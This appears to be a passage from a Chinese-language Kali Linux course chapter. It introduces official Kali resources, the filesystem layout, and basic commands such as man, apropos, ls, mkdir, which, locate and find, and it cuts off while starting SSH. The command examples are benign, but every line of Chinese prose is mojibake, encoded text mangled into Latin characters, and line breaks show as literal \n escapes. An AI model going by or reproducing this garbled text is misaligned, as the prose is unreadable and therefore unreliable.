Linuxçš„èœå•ï¼Œå¸®åŠ©è‡ªå·±ç†Ÿæ‚‰å¯ç”¨çš„å·¥å…·å’Œå®ƒä»¬çš„ç±»åˆ«ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/884573bb-cb89-4b1b-9ba1-d04030299bde/Untitled.png)\n\nå›¾1ï¼šKaliçš„èœå•\n\nä½œä¸ºä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼ŒKali Linuxæä¾›äº†è®¸å¤šç‰¹æ€§å’ŒåŠŸèƒ½ï¼Œæˆ‘ä»¬æ— æ³•åœ¨æœ¬è¯¾ç¨‹ä¸­å®Œå…¨æ¢ç´¢ã€‚ç„¶è€Œï¼Œæœ‰ä¸€äº›å®˜æ–¹çš„Kali Linuxèµ„æºå¯ä¾›è¿›ä¸€æ­¥ç ”ç©¶å’Œå­¦ä¹ ã€‚\n\n- Kali Linux å®˜æ–¹æ–‡æ¡£$^{23}$\n- Kali Linux æ”¯æŒè®ºå›$^{24}$\n- Kali Linux å·¥å…·ç½‘ç«™$^{25}$\n- Kali Linux é”™è¯¯è·Ÿè¸ªå™¨$^{26}$\n- Kali Linux åŸ¹è®­$^{27}$\n\n### Kali Linux å®˜æ–¹æ–‡æ¡£\n\nKali Docsç½‘ç«™$^{28}$ï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯Kali Linuxçš„å®˜æ–¹æ–‡æ¡£åº“ã€‚ è¿™ä¸ªç½‘ç«™æä¾›äº†æœ€æ–°çš„Kaliæ–‡æ¡£ï¼Œè¯¦ç»†ä»‹ç»äº†è®¸å¤šå¸¸è§çš„ç¨‹åºï¼Œå¹¶ä¸”åº”è¯¥è¢«è®¤ä¸ºæ˜¯Kali Linuxæ•…éšœæ’é™¤å’Œæ”¯æŒçš„ç¬¬ä¸€ç«™ã€‚\n\n### Kali Linux æ”¯æŒè®ºå›\n\nä¸‹ä¸€ç«™æ˜¯Kali Linuxæ”¯æŒè®ºå›$^{29}$ã€‚åœ¨å‘å¸–ä¹‹å‰ï¼Œè¯·é˜…è¯»è®ºå›çš„è§„åˆ™å’ŒæŒ‡å—$^{30}$ï¼Œå› ä¸ºä¸ç¬¦åˆè§„å®šçš„å¸–å­é€šå¸¸ä¼šè¢«å®¡æ ¸æˆ–å¿½ç•¥æ‰ã€‚åœ¨åˆ›å»ºä¸€ä¸ªæ–°çš„ä¸»é¢˜ä¹‹å‰ï¼Œä¸€å®šè¦åœ¨è®ºå›ä¸Šå½»åº•æœç´¢ä¹‹å‰å‘å¸ƒçš„è§£å†³æ–¹æ¡ˆã€‚\n\n### Kali Linux å·¥å…·ç½‘ç«™\n\nKaliå…·æœ‰è®¸å¤šæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ¥è‡ªå®‰å…¨å’Œå–è¯é¢†åŸŸçš„å„ç§åˆ©åŸºã€‚ Kaliå·¥å…·ç½‘ç«™$^{31}$æ—¨åœ¨åˆ—å‡ºæ‰€æœ‰è¿™äº›å·¥å…·ï¼Œå¹¶ä¸ºæ¯ä¸ªå·¥å…·æä¾›å¿«é€Ÿå‚è€ƒã€‚ è¿™äº›å·¥å…·çš„ç‰ˆæœ¬å¯ä»¥æ ¹æ®å…¶ä¸Šæ¸¸æ¥æºè¿›è¡Œè¿½è¸ªã€‚ æ­¤å¤–ï¼Œå…³äºæ¯ä¸ªå…ƒåŒ…çš„ä¿¡æ¯ä¹Ÿæ˜¯å¯ç”¨çš„ã€‚å…ƒåŒ…æä¾›äº†çµæ´»æ€§ï¼Œå¯ä»¥æ ¹æ®ç‰¹å®šçš„éœ€æ±‚å®‰è£…ç‰¹å®šçš„å·¥å…·å­é›†ï¼ŒåŒ…æ‹¬æ— çº¿ã€ç½‘ç»œåº”ç”¨ã€å–è¯ã€è½¯ä»¶å®šä¹‰æ— çº¿ç”µç­‰ç­‰ã€‚\n\n### Kali Linux é”™è¯¯è·Ÿè¸ªå™¨\n\nå¶å°”ï¼ŒæŸäº›å·¥å…·å¯èƒ½ä¼šå´©æºƒæˆ–äº§ç”Ÿæ„å¤–çš„ç»“æœã€‚ å½“è¿™ç§æƒ…å†µå‘ç”Ÿæ—¶ï¼Œåœ¨Kali Linux Bug Tracker$^{32}$ç½‘ç«™ä¸Šæœç´¢ç»™å®šçš„é”™è¯¯ä¿¡æ¯å¯èƒ½æœ‰åŠ©äºç¡®å®šè¯¥é—®é¢˜æ˜¯å¦æ˜¯ä¸€ä¸ªbugï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå¦‚ä½•è§£å†³å®ƒã€‚ ç”¨æˆ·ä¹Ÿå¯ä»¥é€šè¿‡è¯¥ç½‘ç«™æŠ¥å‘Šé”™è¯¯æ¥å¸®åŠ©ç¤¾åŒºã€‚\n\n### Kali åŸ¹è®­ç½‘ç«™\n\nKali Linux åŸ¹è®­ç½‘ç«™$^{33}$æ‰¿è½½äº†å®˜æ–¹çš„Kali Linuxæ‰‹å†Œå’ŒåŸ¹è®­è¯¾ç¨‹ã€‚è¿™ä¸ªå…è´¹çš„ç½‘ç«™æ˜¯åŸºäº Kali Linux Revealed$^{34}$ä¸€ä¹¦ï¼Œå¹¶æ‰¿è½½äº†HTML å’Œ PDF æ ¼å¼çš„ä¹¦ç±å†…å®¹ï¼Œæµ‹è¯•ä½ å¯¹ææ–™çŸ¥è¯†çš„ç»ƒä¹ ï¼Œä¸€ä¸ªæ”¯æŒè®ºå›ï¼Œç­‰ç­‰ã€‚è¿™ä¸ªç½‘ç«™åŒ…æ‹¬å¤§é‡æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¸®åŠ©ç”¨æˆ·æ›´å¥½åœ°ç†Ÿæ‚‰ Kali Linuxã€‚\n\n### ç»ƒä¹ \n\n(è¿™äº›ç»ƒä¹ ä¸éœ€è¦æŠ¥å‘Š)\n\n1. å¯åŠ¨ä½ çš„Kaliæ“ä½œç³»ç»Ÿï¼Œå¹¶å°†Kaliç”¨æˆ·å¯†ç æ”¹ä¸ºå®‰å…¨çš„å¯†ç ã€‚\n2. èŠ±ä¸€äº›æ—¶é—´ç†Ÿæ‚‰Kali Linuxçš„èœå•ã€‚\n3. ä½¿ç”¨Kali Toolsç½‘ç«™ï¼Œæ‰¾åˆ°ä½ æœ€å–œæ¬¢çš„å·¥å…·å¹¶æŸ¥çœ‹å…¶æ–‡æ¡£ã€‚å¦‚æœä½ æ²¡æœ‰æœ€å–œæ¬¢çš„å·¥å…·ï¼Œå¯ä»¥é€‰æ‹©ä»»ä½•å·¥å…·ã€‚\n\n## åœ¨ Kali é‡Œæ‰¾åˆ°è‡ªå·±çš„è·¯\n\n### Linux æ–‡ä»¶ç³»ç»Ÿ\n\nKali Linux éµå¾ªæ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡æ ‡å‡†ï¼ˆFHSï¼‰35ï¼Œå®ƒä¸ºæ‰€æœ‰ Linux ç”¨æˆ·æä¾›äº†ä¸€ä¸ªç†Ÿæ‚‰å’Œé€šç”¨çš„å¸ƒå±€ã€‚ä½ ä¼šå‘ç°æœ€æœ‰ç”¨çš„ç›®å½•æ˜¯ï¼š\n\n- **/bin** - åŸºæœ¬ç¨‹åº(ls, cd, cat, ç­‰)\n- **/sbin** - ç³»ç»Ÿç¨‹åºï¼ˆfdiskã€mkfsã€sysctlç­‰ï¼‰\n- **/etc** - é…ç½®æ–‡ä»¶\n- **/tmp** - ä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸åœ¨å¯åŠ¨æ—¶åˆ é™¤ï¼‰\n- **/usr/bin** - åº”ç”¨ç¨‹åºï¼ˆapt, ncat, nmap, ç­‰ï¼‰\n- **/usr/share** - åº”ç”¨ç¨‹åºæ”¯æŒå’Œæ•°æ®æ–‡ä»¶\n\nè¿˜æœ‰è®¸å¤šå…¶ä»–çš„ç›®å½•ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†ä½ å¾ˆå°‘éœ€è¦è¿›å…¥ï¼Œä½†å¯¹Linuxæ–‡ä»¶ç³»ç»Ÿçš„å¸ƒå±€æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ç†Ÿæ‚‰ï¼Œå°†æå¤§åœ°å¸®åŠ©ä½ æé«˜æ•ˆç‡ã€‚\n\n## Linux çš„åŸºæœ¬å‘½ä»¤\n\n### å¸®åŠ©æ‰‹å†Œ\n\næ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬æ·±å…¥äº†è§£Kali Linuxçš„ç”¨æ³•ï¼Œå¹¶æ¢ç´¢ä¸€äº›åŸºæœ¬çš„Linuxå‘½ä»¤ã€‚\n\nå¤§å¤šæ•°ç”¨äºLinuxå‘½ä»¤è¡Œçš„å¯æ‰§è¡Œç¨‹åºéƒ½æä¾›äº†ä¸€ä»½æ­£å¼çš„æ–‡æ¡£ï¼Œé€šå¸¸ç§°ä¸ºæ‰‹å†Œæˆ–manæ‰‹å†Œ$^{36}$ã€‚ä¸€ä¸ªåä¸ºmançš„ç‰¹æ®Šç¨‹åºè¢«ç”¨æ¥æŸ¥çœ‹è¿™äº›é¡µé¢ã€‚ æ‰‹å†Œé¡µé¢é€šå¸¸æœ‰ä¸€ä¸ªåç§°ã€ä¸€ä¸ªæ¦‚è¦ã€ä¸€ä¸ªå…³äºå‘½ä»¤ç›®çš„çš„æè¿°ï¼Œä»¥åŠç›¸åº”çš„é€‰é¡¹ã€å‚æ•°æˆ–å¼€å…³ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹lså‘½ä»¤çš„æ‰‹å†Œé¡µã€‚\n\n```bash\nkali@kali:~$ man ls\n```\n\næ¸…å•3 - æ¢ç´¢lså‘½ä»¤çš„æ‰‹å†Œé¡µ\n\nå¸®åŠ©æ‰‹å†Œä¸ä»…åŒ…å«æœ‰å…³ç”¨æˆ·å‘½ä»¤çš„ä¿¡æ¯ï¼Œè€Œä¸”è¿˜åŒ…å«æœ‰å…³ç³»ç»Ÿç®¡ç†å‘½ä»¤ã€ç¼–ç¨‹æ¥å£ç­‰çš„æ–‡æ¡£ã€‚ç³»ç»Ÿç®¡ç†å‘½ä»¤ã€ç¼–ç¨‹æ¥å£ç­‰æ–¹é¢çš„æ–‡æ¡£ã€‚æœ¬æ‰‹å†Œçš„å†…å®¹è¢«åˆ†ä¸ºè‹¥å¹²ç« èŠ‚ï¼Œå…¶ç¼–å·å¦‚ä¸‹ï¼š\n\nè¡¨2 - å¸®åŠ©æ‰‹å†Œçš„ç»„ç»‡\n\nè¦ç¡®å®šé€‚å½“çš„æ‰‹å†Œç« èŠ‚ï¼Œåªéœ€è¿›è¡Œå…³é”®å­—æœç´¢ã€‚ ä¾‹å¦‚ï¼Œè®©æˆ‘ä»¬å‡è®¾æˆ‘ä»¬æœ‰å…´è¶£äº†è§£æ›´å¤šå…³äº **/etc/passwd** æ–‡ä»¶æ ¼å¼çš„ä¿¡æ¯ã€‚åœ¨å‘½ä»¤è¡Œè¾“å…¥**man passwd**ï¼Œå°†æ˜¾ç¤ºæ‰‹å†Œç¬¬1èŠ‚ä¸­æœ‰å…³ **passwd** å‘½ä»¤çš„ä¿¡æ¯ï¼ˆå›¾2ï¼‰ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æ„Ÿå…´è¶£çš„å†…å®¹ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c02a67e2-cc44-4cb1-95aa-5c58aa1330a1/Untitled.png)\n\nå›¾2ï¼šè¦æ±‚æ‰‹åŠ¨è¾“å…¥passwdæ–‡ä»¶\n\nç„¶è€Œï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ **man** ä¸­çš„ **-k** é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå…³é”®è¯æœç´¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n```bash\nkali@kali:~$ man -k passwd\nchgpasswd (8) - åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹æ›´æ–°ç»„å¯†ç \nchpasswd (8) - ä»¥æ‰¹å¤„ç†æ–¹å¼æ›´æ–°å¯†ç \nexim4_passwd (5) - Debian exim4 è½¯ä»¶åŒ…æ‰€ä½¿ç”¨çš„æ–‡ä»¶\nexim4_passwd_client (5) - Debian exim4 è½¯ä»¶åŒ…æ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶\nexpect_mkpasswd (1) - ç”Ÿæˆæ–°çš„å¯†ç ï¼Œå¯é€‰æ‹©å°†å…¶åº”ç”¨äºä¸€ä¸ªç”¨æˆ·\nfgetpwent_r (3) - è·å–å¯†ç æ–‡ä»¶æ¡ç›®ï¼Œå¹¶å°†å…¶é›†ä¸­åœ¨ä¸€èµ·\ngetpwent_r (3) - é‡å¤è·å–passwdæ–‡ä»¶æ¡ç›®\ngpasswd (1) - ç®¡ç† /etc/group å’Œ /etc/gshadow\ngrub-mkpasswd-pbkdf2 (1) - ä¸ºGRUBç”Ÿæˆæ•£åˆ—å¯†ç \nhtpasswd (1) - ç®¡ç†åŸºæœ¬è®¤è¯çš„ç”¨æˆ·æ–‡ä»¶\n...\n```\n\næ¸…å• 4 - ä½¿ç”¨ man æ‰§è¡Œ passwd å…³é”®å­—æœç´¢\n\næˆ‘ä»¬å¯ä»¥åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„å¸®åŠ©ä¸‹è¿›ä¸€æ­¥ç¼©å°æœç´¢èŒƒå›´ï¼š$^{37}$\n\n```bash\nkali@kali:~$ man -k '^passwd$'\npasswd (1) - æ›´æ”¹ç”¨æˆ·å¯†ç \npasswd (1ssl) - è®¡ç®—å¯†ç æ•£åˆ—å€¼\npasswd (5) - å¯†ç æ–‡ä»¶\n```\n\næ¸…å•5 - ç¼©å°æˆ‘ä»¬çš„æœç´¢èŒƒå›´\n\nåœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼è¢«åœ†ç‚¹(^)å’Œç¾å…ƒç¬¦å·($)æ‰€åŒ…å›´ï¼Œä»¥ä¾¿ åŒ¹é…æ•´ä¸ªè¡Œï¼Œé¿å…å­å­—ç¬¦ä¸²åŒ¹é…ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•ç”¨é€‚å½“çš„ç« èŠ‚æ¥æŸ¥çœ‹æˆ‘ä»¬æ„Ÿå…´è¶£çš„ç¡®åˆ‡çš„ passwd æ‰‹å†Œé¡µé¢ã€‚\n\n```bash\nkali@kali:~$ man 5 passwd\n```\n\næ¸…å• 6 - ä½¿ç”¨ man æŸ¥çœ‹ /etc/passwd æ–‡ä»¶æ ¼å¼çš„æ‰‹å†Œé¡µ\n\nå¸®åŠ©æ‰‹å†Œé€šå¸¸æ˜¯å¯»æ‰¾æŸä¸ªç‰¹å®šå‘½ä»¤çš„æ–‡æ¡£çš„æœ€å¿«æ·æ–¹å¼ï¼Œæ‰€ä»¥èŠ±ç‚¹æ—¶é—´æ¥æ›´è¯¦ç»†åœ°æ¢ç´¢å®ƒä»¬ã€‚\n\n### apropos\n\nä½¿ç”¨apropos$^{38}$å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸€ä¸ªå…³é”®è¯åœ¨man pageæè¿°çš„åˆ—è¡¨ä¸­æœç´¢å¯èƒ½çš„åŒ¹é…ã€‚è™½ç„¶è¿™æœ‰ç‚¹ç²—ç³™ï¼Œä½†å¯¹äºæ ¹æ®æè¿°æ‰¾åˆ°ä¸€ä¸ªç‰¹å®šçš„å‘½ä»¤æ¥è¯´ï¼Œå¾€å¾€å¾ˆæœ‰å¸®åŠ©ã€‚è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ã€‚å‡è®¾æˆ‘ä»¬æƒ³å¯¹ä¸€ä¸ªç¡¬ç›˜è¿›è¡Œåˆ†åŒºï¼Œä½†å´ä¸è®°å¾—è¯¥å‘½ä»¤çš„åç§°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢ \"partition \"æ¥å¼„æ¸…æ¥šè¿™ä¸ªé—®é¢˜ã€‚\n\n```bash\nkali@kali:~$ apropos partition\naddpart (8) - å‘Šè¯‰å†…æ ¸ä¸€ä¸ªåˆ†åŒºçš„å­˜åœ¨\ncfdisk (8) - æ˜¾ç¤ºæˆ–æ“ä½œä¸€ä¸ªç£ç›˜åˆ†åŒºè¡¨\ncgdisk (8) - åŸºäºCursesçš„GUIDåˆ†åŒºè¡¨ï¼ˆGPTï¼‰æ“çºµå™¨\ncgpt (1) - ç”¨Chromium OSæ¥æ“ä½œGPTåˆ†åŒºçš„å®ç”¨ç¨‹åº ...\ndelpart (8) - å‘Šè¯‰å†…æ ¸å¿˜è®°ä¸€ä¸ªåˆ†åŒºçš„å­˜åœ¨\nextundelete (1) - æ’¤é”€ext3æˆ–ext4åˆ†åŒºçš„æ–‡ä»¶çš„å·¥å…·ã€‚\nfdisk (8) - æ“çºµç£ç›˜åˆ†åŒºè¡¨\nfixparts (8) - MBRåˆ†åŒºè¡¨ä¿®å¤å·¥å…·\ngdisk (8) - äº¤äº’å¼GUIDåˆ†åŒºè¡¨ï¼ˆGPTï¼‰æ“çºµå™¨\ngparted (8) - ç”¨äºæ“çºµç£ç›˜åˆ†åŒºçš„ GNOME åˆ†åŒºç¼–è¾‘å™¨ã€‚\n...\n```\n\næ¸…å•7 - ä½¿ç”¨aproposæ¥å¯»æ‰¾æè¿°ä¸­å«æœ‰ â€œåˆ†åŒº â€çš„å‘½ä»¤\n\nè¯·æ³¨æ„ï¼Œ**apropos** ä¼¼ä¹ä¸ **man -k** çš„åŠŸèƒ½ç›¸åŒï¼›äº‹å®ä¸Šï¼Œå®ƒä»¬æ˜¯ç­‰åŒçš„ã€‚\n\n### åˆ—è¡¨æ–‡ä»¶\n\n**ls** å‘½ä»¤åœ¨å±å¹•ä¸Šæ‰“å°å‡ºä¸€ä¸ªåŸºæœ¬çš„æ–‡ä»¶æ¸…å•ã€‚æˆ‘ä»¬å¯ä»¥ç”¨å„ç§é€šé…ç¬¦ä¿®æ”¹è¾“å‡ºç»“æœã€‚**-a** é€‰é¡¹ç”¨äºæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—çš„æ–‡ä»¶ï¼‰ï¼Œ**-l** é€‰é¡¹å°†æ¯ä¸ªæ–‡ä»¶æ˜¾ç¤ºåœ¨å•è¡Œä¸Šï¼Œè¿™å¯¹è‡ªåŠ¨åŒ–éå¸¸æœ‰ç”¨ã€‚\n\n```bash\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public Templates Videos\n\nkali@kali:~$ ls /etc/apache2/sites-available/*.conf\n/etc/apache2/sites-available/000-default.conf\n/etc/apache2/sites-available/default-ssl.conf\n\nkali@kali:~$ ls -a1\n.\n..\n.bash_history\n.bashrc\n.cache\n.config\nDesktop\nDocuments\n...\n```\n\næ¸…å•8ï¼šæ–‡ä»¶åˆ—è¡¨\n\n### å·¦å³ç§»åŠ¨\n\nLinux ä¸ä½¿ç”¨ Windows é£æ ¼çš„é©±åŠ¨å™¨å­—æ¯ã€‚ç›¸åï¼Œæ‰€æœ‰çš„æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œè®¾å¤‡éƒ½æ˜¯æ ¹ç›®å½•çš„å­ç›®å½•ï¼Œç”¨ \"/\" å­—ç¬¦è¡¨ç¤ºã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ **cd** å‘½ä»¤ï¼Œåœ¨åé¢åŠ ä¸Šä¸€ä¸ªè·¯å¾„ï¼Œä»¥æ”¹å˜åˆ°æŒ‡å®šçš„ç›®å½•ã€‚**pwd** å‘½ä»¤å°†æ‰“å°å‡ºå½“å‰çš„ç›®å½•ï¼ˆå¦‚æœä½ è¿·è·¯äº†ï¼Œè¿™å¾ˆæœ‰å¸®åŠ©ï¼‰ï¼Œè¿è¡Œ **cd ~** å°†è¿”å›åˆ°ä¸»ç›®å½•ã€‚\n\n```bash\nkali@kali:~$ cd /usr/share/metasploit-framework/\n\nkali@kali:/usr/share/metasploit-framework$ pwd\n/usr/share/metasploit-framework\n\nkali@kali:/usr/share/metasploit-framework$ cd ~\n\nkali@kali:~$ pwd\n/home/kali\n```\n\næ¸…å• 9 - åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ç§»åŠ¨\n\n### åˆ›å»ºç›®å½•\n\nå‘½ä»¤åé¢è·Ÿç€ä¸€ä¸ªç›®å½•çš„åç§°ï¼Œå°±å¯ä»¥åˆ›å»ºæŒ‡å®šçš„ç›®å½•ã€‚ç›®å½•åç§°å¯ä»¥åŒ…å«ç©ºæ ¼ï¼Œä½†ç”±äºæˆ‘ä»¬å°†åœ¨å‘½ä»¤è¡Œä¸ŠèŠ±è´¹å¤§é‡çš„æ—¶é—´ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨è¿å­—ç¬¦æˆ–ä¸‹åˆ’çº¿æ¥ä»£æ›¿ï¼Œä»è€Œä¸ºè‡ªå·±çœå»å¾ˆå¤šéº»çƒ¦ã€‚ è¿™äº›å­—ç¬¦å°†ä½¿è‡ªåŠ¨å®Œæˆï¼ˆç”¨ `Tab` é”®æ‰§è¡Œï¼‰æ›´å®¹æ˜“å®Œæˆã€‚\n\n```bash\nkali@kali:~$ mkdir notes\n\nkali@kali:~$ cd notes/\n\nkali@kali:~/notes$ mkdir module one\n\nkali@kali:~/notes$ ls\nmodule one\n\nkali@kali:~/notes$ rm -rf module/ one/\n\nkali@kali:~/notes$ mkdir \"module one\"\n\nkali@kali:~/notes$ cd module\\\\ one/\n\nkali@kali:~/notes/module one$\n```\n\næ¸…å•10 - åœ¨Kaliä¸­åˆ›å»ºç›®å½•\n\næˆ‘ä»¬å¯ä»¥ç”¨éå¸¸æœ‰ç”¨çš„ **mkdir -p** ä¸€æ¬¡åˆ›å»ºå¤šä¸ªç›®å½•ï¼Œå®ƒä¹Ÿä¼šåˆ›å»ºä»»ä½•éœ€è¦çš„çˆ¶ç›®å½•ã€‚è¿™å¯ä»¥ä¸æ‹¬å·æ‰©å±•ç›¸ç»“åˆï¼Œæœ‰æ•ˆåœ°åˆ›å»ºä¸€ä¸ªç›®å½•ç»“æ„ï¼Œä¾‹å¦‚ï¼Œå­˜å‚¨ä½ çš„æ¸—é€æµ‹è¯•ç¬”è®°ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåä¸º **test** çš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸­åˆ›å»ºäº†ä¸‰ä¸ªå­ç›®å½•ï¼Œåä¸º **recon**ã€**exploit** å’Œ **report**ã€‚\n\n```bash\nkali@kali:~$ mkdir -p test/{recon,exploit,report}\n\nkali@kali:~$ ls -1 test/\nexploit\nrecon\nreport\n```\n\næ¸…å•11 - åˆ›å»ºä¸€ä¸ªç›®å½•ç»“æ„\n\n## åœ¨ Kali Linux ä¸­å¯»æ‰¾æ–‡ä»¶\n\nåœ¨ kali ä¸­ï¼Œæœ‰ä¸‰ä¸ªæœ€å¸¸ç”¨çš„æŸ¥æ‰¾æ–‡ä»¶çš„æ–¹å¼ï¼Œfindã€locate è¿˜æœ‰ whichã€‚è¿™äº›å·¥å…·æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†å·¥ä½œå’Œè¿”å›æ•°æ®çš„æ–¹å¼ä¸åŒï¼Œå› æ­¤å¯ä»¥åœ¨ä¸åŒçš„æƒ…å†µä¸‹ä½¿ç”¨\n\n### Which\n\n**which** $^{39}$å‘½ä»¤åœ¨ $PATH ç¯å¢ƒå˜é‡ä¸­å®šä¹‰çš„ç›®å½•ä¸­æœç´¢æŒ‡å®šçš„æ–‡ä»¶åã€‚è¿™ä¸ªå˜é‡åŒ…å«äº† kali åœ¨å‘å¸ƒå‘½ä»¤æ—¶æœç´¢çš„ç›®å½•æ¸…å•ï¼Œè€Œä¸åŒ…å«è·¯å¾„ã€‚å¦‚æœæ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„ï¼Œ**which** ä¼šè¿”å›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n\n```bash\nkali@kali:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nkali@kali:~$ which sbd\n/usr/bin/sbd\n```\n\næ¸…å•12 - æ¢ç´¢ which å‘½ä»¤\n\n### Locate\n\nlocate $^{40}$å‘½ä»¤æ˜¯åœ¨ kali ä¸­æŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½•ä½ç½®çš„æœ€å¿«æ·æ–¹å¼ã€‚ä¸ºäº†æä¾›æ›´çŸ­çš„æœç´¢æ—¶é—´ï¼Œ**locate** æœç´¢ä¸€ä¸ªåä¸º **locate.db** çš„å†…ç½®æ•°æ®åº“ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç¡¬ç›˜æœ¬èº«ã€‚è¿™ä¸ªæ•°æ®åº“æ˜¯ç”± cron è°ƒåº¦ç¨‹åºå®šæœŸè‡ªåŠ¨æ›´æ–°ã€‚è¦æ‰‹åŠ¨æ›´æ–° **locate.db** æ•°æ®åº“ï¼Œä½ å¯ä»¥ä½¿ç”¨ **updatedb** å‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ sudo updatedb\n\nkali@kali:~$ locate sbd.exe\n/usr/share/windows-resources/sbd/sbd.exe\n```\n\næ¸…å•13 - æ¢ç´¢ locate å‘½ä»¤\n\n### Find\n\nfind $^{41}$å‘½ä»¤æ˜¯è¿™ä¸‰ä¸ªå·¥å…·ä¸­æœ€å¤æ‚å’Œæœ€çµæ´»çš„æœç´¢å·¥å…·ã€‚æŒæ¡å®ƒçš„è¯­æ³•æœ‰æ—¶ä¼šå¾ˆæ£˜æ‰‹ï¼Œä½†å®ƒçš„èƒ½åŠ›è¶…å‡ºäº†æ™®é€šçš„æ–‡ä»¶æœç´¢ã€‚**find** å‘½ä»¤çš„æœ€åŸºæœ¬ç”¨æ³•å¦‚æ¸…å•æ‰€ç¤ºï¼Œæˆ‘ä»¬ä»è·Ÿæ–‡ä»¶ç³»ç»Ÿç›®å½•å¼€å§‹è¿›è¡Œé€’å½’æœç´¢ï¼Œå¯»æ‰¾ä»»ä½•ä»¥å­—æ¯ â€œsbdâ€ å¼€å¤´çš„æ–‡ä»¶ã€‚\n\n```bash\nkali@kali:~$ sudo find / -name sbd*\n/usr/bin/sbd\n/usr/share/doc/sbd\n/usr/share/windows-resources/sbd\n/usr/share/windows-resources/sbd/sbd.exe\n/usr/share/windows-resources/sbd/sbdbg.exe\n/var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb\n/var/lib/dpkg/info/sbd.md5sums\n/var/lib/dpkg/info/sbd.list\n```\n\næ¸…å•14 - æ¢ç´¢ find å‘½ä»¤\n\nä¸ locate ç›¸æ¯”ï¼Œfind çš„ä¸»è¦ä¼˜ç‚¹æ˜¯å®ƒå¯ä»¥é€šè¿‡ä¸ä»…ä»…æ˜¯åç§°æ¥æœç´¢æ–‡ä»¶å’Œç›®å½•ã€‚é€šè¿‡ findï¼Œæˆ‘å¯ä»¥æŒ‰æ–‡ä»¶å¹´é¾„ã€å¤§å°ã€æ‰€æœ‰è€…ã€æ–‡ä»¶ç±»å‹ã€æ—¶é—´æˆ³ã€æƒé™ç­‰è¿›è¡Œæœç´¢ã€‚$^{42}$\n\n### ç»ƒä¹ \n\n1. ä½¿ç”¨ **man** æŸ¥çœ‹ä½ å–œæ¬¢çš„ä¸€ä¸ªå‘½ä»¤çš„ man é¡µã€‚\n2. ä½¿ç”¨ **man** æŸ¥æ‰¾ä¸æ–‡ä»¶å‹ç¼©æœ‰å…³çš„å…³é”®è¯ã€‚\n3. ä½¿ç”¨ **which** æŸ¥æ‰¾ä½ çš„ Kali è™šæ‹Ÿæœºä¸Šçš„ **pwd** å‘½ä»¤ã€‚\n4. ä½¿ç”¨ **locate** åœ¨ä½ çš„ Kali è™šæ‹Ÿæœºä¸Šæ‰¾åˆ° **wce32.exe**ã€‚\n5. ä½¿ç”¨ **find** æ¥è¯†åˆ«ä»»ä½•åœ¨è¿‡å»ä¸€å¤©ä¸­ä¿®æ”¹è¿‡çš„ã€ä¸å±äº root ç”¨æˆ·çš„æ–‡ä»¶ï¼ˆä¸æ˜¯ç›®å½•ï¼‰ï¼Œå¹¶å¯¹å®ƒä»¬æ‰§è¡Œ **ls -l**ã€‚ä¸å…è®¸ä½¿ç”¨é“¾å¼/ç®¡é“å¼å‘½ä»¤!\n\n## ç®¡ç† Linux Kali æœåŠ¡\n\n### SSH æœåŠ¡\n\nå®‰å…¨æœåŠ¡å™¨ï¼ˆSSHï¼‰æœåŠ¡æœ€å¸¸ç”¨äºè¿œç¨‹è®¿é—®è®¡ç®—æœºï¼Œä½¿ç”¨å®‰å…¨ã€åŠ å¯†çš„åè®®ã€‚SSH æœåŠ¡æ˜¯åŸºäº TCP çš„ï¼Œé»˜è®¤ç›‘å¬ç«¯å£ä¸º 22ã€‚è¦åœ¨ Kali ä¸­å¯åŠ¨ SSH æœåŠ¡ï¼Œæˆ‘ä»¬è¦è¿è¡Œ systemctlï¼Œåœ¨å¯åŠ¨é€‰é¡¹åé¢åŠ ä¸ŠæœåŠ¡åç§°ï¼ˆæœ¬ä¾‹ä¸­ä¸ºsshï¼‰ã€‚\n\n```bash\nkali@kali:~$ sudo systemctl start 